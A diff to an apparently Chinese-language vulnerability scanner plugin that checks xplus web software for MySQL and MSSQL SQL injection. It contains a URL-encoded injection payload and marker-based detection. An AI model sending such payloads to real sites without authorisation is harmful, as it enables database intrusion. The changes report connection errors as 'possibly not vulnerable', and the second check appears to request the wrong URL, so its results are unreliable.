@@ -25,14 +25,18 @@ class xplus_mysql_mssql_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                 cprint("[+]存在xplus MYSQL通用注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+            else:
+                cprint("[-]不存在xplus_mysql_mssql_sqli漏洞", "white", "on_grey")
 
             payload = "/www/index.php?mod=index&con=Review&act=getallpaper&papertype=scrb%27AnD%20ChAr(71)%252BChAr(65)%252BChAr(79)%252BChAr(74)%252BChAr(73)%252B@@VeRsIon%3E0--"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"GAOJIMicrosoft" in req.text:
                 cprint("[+]存在xplus MSSQL通用注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+            else:
+                cprint("[-]不存在xplus_mysql_mssql_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
